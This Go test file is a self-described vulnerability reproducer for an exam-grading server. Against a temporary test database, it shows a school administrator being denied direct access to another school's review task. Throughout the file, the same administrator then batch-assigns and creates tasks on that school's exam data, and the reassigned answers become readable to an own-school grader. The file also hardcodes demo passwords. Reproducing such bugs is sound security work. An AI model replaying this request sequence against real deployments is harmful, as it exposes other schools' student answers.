package server

import (
	"net/http"
	"os"
	"testing"
)

// This is a vulnerability reproducer, not a regression test: success means the
// currently unauthorized writes were accepted. All rows live in a temporary DB.
func TestReviewSchoolBoundaryReproWithPostgresTestDatabase(t *testing.T) {
	dsn := os.Getenv("EDUGRADE_E2E_DATABASE_URL")
	if dsn == "" { t.Skip("EDUGRADE_E2E_DATABASE_URL is not set") }
	database := e2eOpenPostgresTestDB(t, dsn)
	e2eApplyPostgresMigrations(t, database)
	e2eActivatePostgresDemoUsers(t, database, []string{"tenant_admin", "school_admin", "grader"})
	router := e2ePostgresRouter(database)
	adminToken := e2eLoginWithTenant(t, router, "demo", "tenant_admin", "ChangeMe123!")
	ownSchool := e2ePostJSON(t, router, http.MethodPost, "/api/v1/schools", adminToken,
		`{"name":"Review attacker's school","code":"review-boundary-own"}`, http.StatusCreated)["school"].(map[string]any)
	ownSchoolID := e2eString(t, ownSchool, "id")
	e2eBindPostgresSchoolAdmin(t, database, "school_admin", ownSchoolID)
	graderID := e2eLookupUserID(t, database, "demo", "grader")
	if _, err := database.Exec(`UPDATE app_user SET school_id=$1::uuid WHERE id=$2::uuid`, ownSchoolID, graderID); err != nil { t.Fatal(err) }
	schoolToken := e2eLoginWithTenant(t, router, "demo", "school_admin", "ChangeMe123!")
	foreign := e2eCreateStory056AcceptanceFixture(t, database, router, adminToken, "review-boundary-foreign")
	if ownSchoolID == foreign.SchoolID { t.Fatal("schools must differ") }
	e2eSeedStory056AcceptanceAnswersCount(t, database, foreign, "review-boundary-foreign", 2)
	var firstSegment, secondSegment string
	if err := database.QueryRow(`SELECT seg.id::text FROM answer_segment seg JOIN submission s ON s.id=seg.submission_id AND s.tenant_id=seg.tenant_id WHERE s.exam_id=$1::uuid AND seg.question_id=$2::uuid`, foreign.ExamID, foreign.QuestionIDs["single_choice"]).Scan(&firstSegment); err != nil { t.Fatal(err) }
	if err := database.QueryRow(`SELECT seg.id::text FROM answer_segment seg JOIN submission s ON s.id=seg.submission_id AND s.tenant_id=seg.tenant_id WHERE s.exam_id=$1::uuid AND seg.question_id=$2::uuid`, foreign.ExamID, foreign.QuestionIDs["true_false"]).Scan(&secondSegment); err != nil { t.Fatal(err) }
	created := e2ePostJSON(t, router, http.MethodPost, "/api/v1/review-tasks", adminToken,
		story056JSON(t, map[string]any{"answer_segment_id": firstSegment, "source": "manual_sample"}), http.StatusCreated)["task"].(map[string]any)
	taskID := e2eString(t, created, "id")
	revision := int64(created["revision"].(float64))
	denied := e2eExpectStatus(t, router, http.MethodGet, "/api/v1/review-tasks/"+taskID, schoolToken, "", http.StatusForbidden)
	t.Logf("CONTROL other-school task GET: status=%d body=%s", denied.Code, denied.Body.String())
	denied = e2eExpectStatus(t, router, http.MethodPost, "/api/v1/review-tasks/"+taskID+"/assign", schoolToken,
		story056JSON(t, map[string]any{"assigned_to": graderID, "expected_revision": revision}), http.StatusForbidden)
	t.Logf("CONTROL other-school individual assign: status=%d body=%s", denied.Code, denied.Body.String())
	batch := e2eExpectStatus(t, router, http.MethodPost, "/api/v1/review-tasks/batch-assign", schoolToken,
		story056JSON(t, map[string]any{"task_ids": []string{taskID}, "assigned_to": graderID, "expected_revisions": map[string]int64{taskID: revision}}), http.StatusOK)
	t.Logf("VULNERABILITY other-school batch assign: status=%d body=%s", batch.Code, batch.Body.String())
	var assignedTo, status string
	var storedRevision int64
	if err := database.QueryRow(`SELECT assigned_to::text,status,revision FROM review_task WHERE id=$1::uuid`, taskID).Scan(&assignedTo, &status, &storedRevision); err != nil { t.Fatal(err) }
	if assignedTo != graderID || status != "assigned" || storedRevision != revision+1 { t.Fatalf("unauthorized write not durable: assigned=%s status=%s revision=%d", assignedTo, status, storedRevision) }
	t.Logf("DURABLE other-school task now assigned to own-school grader; revision %d -> %d", revision, storedRevision)
	newTask := e2eExpectStatus(t, router, http.MethodPost, "/api/v1/review-tasks", schoolToken,
		story056JSON(t, map[string]any{"answer_segment_id": secondSegment, "source": "manual_sample", "assigned_to": graderID}), http.StatusCreated)
	t.Logf("VULNERABILITY other-school create task: status=%d body=%s", newTask.Code, newTask.Body.String())
	var unauthorizedCreated int
	if err := database.QueryRow(`SELECT count(*) FROM review_task rt JOIN app_user u ON u.id=rt.created_by AND u.tenant_id=rt.tenant_id WHERE rt.answer_segment_id=$1::uuid AND u.username='school_admin' AND rt.exam_id=$2::uuid`, secondSegment, foreign.ExamID).Scan(&unauthorizedCreated); err != nil { t.Fatal(err) }
	if unauthorizedCreated != 1 { t.Fatalf("unauthorized create count=%d", unauthorizedCreated) }
	graderToken := e2eLoginWithTenant(t, router, "demo", "grader", "ChangeMe123!")
	visible := e2eExpectStatus(t, router, http.MethodGet, "/api/v1/review-tasks/"+taskID+"/context", graderToken, "", http.StatusOK)
	t.Logf("IMPACT own-school grader can read reassigned other-school context: status=%d response_bytes=%d", visible.Code, visible.Body.Len())
}
